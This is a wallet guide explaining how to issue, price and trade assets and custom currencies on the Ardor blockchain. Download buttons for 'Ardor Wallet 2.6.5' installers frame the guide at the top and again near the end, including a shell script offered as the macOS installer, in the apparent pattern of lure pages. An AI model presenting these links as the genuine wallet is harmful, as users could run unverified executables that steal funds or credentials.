![Ardor Wallet guide](assets/banner-article.png)

# Issue an asset or a custom currency on Ardor, and trade it

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Issuing an asset on Ardor takes a form in the wallet, a name, a quantity and a fee: the asset is created on the chain, appears in your account, and can be traded on the asset exchange with royalties and dividend payments built in. A custom currency is the same idea with monetary properties attached.

## What an asset is here

An asset is a token issued by an account, with a fixed quantity set at issuance and a name that identifies it. It is not a smart [contract](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-lightweight-contracts.md): there is no code to deploy, no address to import and no separate network to trust.

That is the distinguishing feature of the platform. Everything an issuer usually needs - a supply, a market, a way to pay holders, a royalty on secondary sales - is a protocol feature rather than a contract somebody has to write and audit.

## Issuing one

1. Open the wallet, unlock the [Ardor account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) and select the chain you are issuing on.
2. Open the asset issuance form and enter the name and description.
3. Set the quantity, the number of decimal places and whether the supply can be increased later.
4. Review the [Ardor fee](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md) and confirm the transaction.
5. Check that the asset appears in your account and that the quantity matches what you set.

Step three deserves real thought, because those decisions are effectively permanent. A supply that cannot be increased is a promise; one that can be increased is a different promise, and holders will read it that way.

## Royalties on secondary trades

An issuer can set a royalty that is collected when the asset changes hands on the [Ardor exchange](https://github.com/ardor-software/ardor-wallet-guides/blob/main/send-ardr-from-ardor-wallet-to-an-exchange.md). It is paid by the seller as part of the trade, and it goes to the issuer's account.

For a creator, that is the practical difference between a token that pays once at issuance and one that participates in its own market. For a buyer, it is a cost to check before trading, because the effective price includes it.

## Paying holders

The asset exchange includes a dividend payment: the issuer specifies an asset and an amount per unit, and the payment is distributed to holders. It is the mechanism behind the "pay dividends" feature that makes an issued asset behave like a claim rather than a collectible.

The details that matter are the amount per unit, the asset used to pay, and who counts as a holder at the moment of payment. Those are worth confirming on screen before signing, because a dividend is a transaction like any other and it is not reversible.

## Trading the asset

Once issued, the asset trades on the asset exchange, which uses the same order book model as the coin exchange: you place a limit order, it sits in the book, and it fills when somebody takes it.

An asset can be priced in ARDR or in a child chain token, depending on the pair. The liquidity question is the same as anywhere: a new asset with no orders has no market yet, and the issuer is usually the first participant.

## Custom currencies

A custom currency adds monetary-system features to the same idea: a named currency with its own supply rules, issuable and transferable on the chain. It is the tool for a community token or an internal unit rather than for an equity-like asset.

The distinction matters when choosing. An asset is the right shape for something with holders and a market; a currency is the right shape for something spent inside a system.

Getting that wrong is not fatal, but it is visible. A currency with no acceptance is a token nobody spends, and an asset used as an internal unit does not need royalties or dividends at all. Pick the shape that matches how the thing will actually be used.

## Getting from issuance to a market

An issued asset has no market until somebody posts an order. In practice the issuer does: a small sell order at a sensible price gives the asset a visible quote, and a small buy order gives anyone holding it somewhere to exit.

That two-sided start is what turns a token into something people can reason about. Without it, an asset exists on chain and nowhere else, and holders discover that the hard way after they have bought in.

## What issuance does not give you

It does not create demand, it does not list the asset anywhere, and it does not make the issuer's promises enforceable. The chain records the supply and the trades; it does not verify what the asset represents.

That is worth saying plainly because issuance is easy and distribution is not. A token with a name and a supply is a technical fact; a token with a market is a different achievement.

## FAQ

### Do I need to write a smart contract?

No. Issuance is a wallet form and a transaction. There is no code to deploy and no contract address to publish.

### Can I increase the supply later?

Only if you chose that option at issuance. Otherwise the supply is fixed, which is what most holders will assume.

### How do royalties get paid?

They are collected on secondary trades on the asset exchange and credited to the issuer's account as part of the trade.

### Can I issue on the parent chain?

Issuance happens on the chain you select. Most platform features, including assets, live on the child chains, so check the selector before starting.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Trade on the Ardor coin exchange](https://github.com/ardor-software/ardor-platform-guides/blob/main/trade-on-the-ardor-coin-exchange.md)
- [Pay dividends to every asset holder in one action](https://github.com/ardor-software/ardor-platform-guides/blob/main/pay-dividends-to-asset-holders-on-ardor.md)
- [What Ignis is on Ardor, and what the wallet does with it](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md)
- [Sell on the Ardor marketplace](https://github.com/ardor-software/ardor-platform-guides/blob/main/sell-on-the-ardor-marketplace.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
